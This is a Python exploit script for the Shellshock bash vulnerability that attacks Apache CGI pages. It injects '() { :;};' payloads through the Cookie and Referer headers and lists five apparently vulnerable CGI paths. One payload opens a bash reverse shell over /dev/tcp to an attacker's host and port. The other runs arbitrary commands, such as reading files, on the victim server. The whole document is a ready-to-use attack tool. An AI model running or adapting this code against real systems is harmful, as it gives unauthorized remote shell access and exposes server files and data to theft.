#!/usr/bin/env python3
import requests
import sys

def usage():
    
    text = (
    """
    Shellshock Apache remote exploit
    
    Usage:
        ./Shellshock.py payload=reverse rhost=1.2.3.4 page=3 lhost=5.6.7.8 lport=1234
        ./Shellshock.py payload=files rhost=1.2.3.4 rport=80 page=3 echo="ls -la"
        ./Shellshock.py payload=files rhost=1.2.3.4 rport=80 page=3 echo="cat file.txt"

    Variables:
        Victim:
            rhost => Victim IP
            rport => Victim PORT 
            
        Attacker (For reverse shell):
            lhost => Attacker IP
            lport => Attacker PORT for reverse shell 
        
        Echo:
            echo => Custom command to inject
            
            Examples:
                echo="ls -la"
                echo="cat file.txt"
            
        Config:
            pages => Specific cgi vulnerable pages 
                Exploitable pages:
                    [0] /cgi-sys/entropysearch.cgi",
                    [1] /cgi-sys/defaultwebpage.cgi",
                    [2] /cgi-mod/index.cgi",
                    [3] /cgi-bin/test.cgi",
                    [4] /cgi-bin-sdb/printenv            
        Payloads:
            "reverse" => (unix unversal) TCP reverse shell (Requires: rhost, lhost, lport)
            "files" => Read and browse through files (Requires: rhost, echo)           
        Created by Filip StudenÃ½

    """)

    print(text)

def exploit(payload,url):
    headers = {
        "Cookie": payload, 
        "Referer": payload
        }
    res = requests.get(url, headers=headers)
    print(res.text)

pages = [
        "/cgi-sys/entropysearch.cgi",
        "/cgi-sys/defaultwebpage.cgi",
        "/cgi-mod/index.cgi",
        "/cgi-bin/test.cgi",
        "/cgi-bin-sdb/printenv"
        ]

args = {}
try:
    for arg in sys.argv[1:]:
        ar = arg.split("=")
        args[ar[0]] = ar[1]
except:
    pass


if(args['payload'] == 'reverse'):
        lhost = args["lhost"]
        lport = args["lport"]
        rhost = args["rhost"]
        page = pages[int(args["page"])]

        payload="() { :;}; /bin/bash -c '/bin/bash -i >& /dev/tcp/" + lhost + "/" + lport + " 0>&1'"

        url= "http://" + rhost + page

        exploit(payload, url)
    
    
if(args['payload'] == 'files'):
    try:
        rhost = args["rhost"]
        page = pages[int(args["page"])]
        echo = args["echo"]

        payload ="() { :;}; echo; echo; /bin/bash -c \'" + echo + "\'"

        url= "http://" + rhost + page

        exploit(payload, url)   
    except:
            print("[!] ERROR [!]")
            usage()


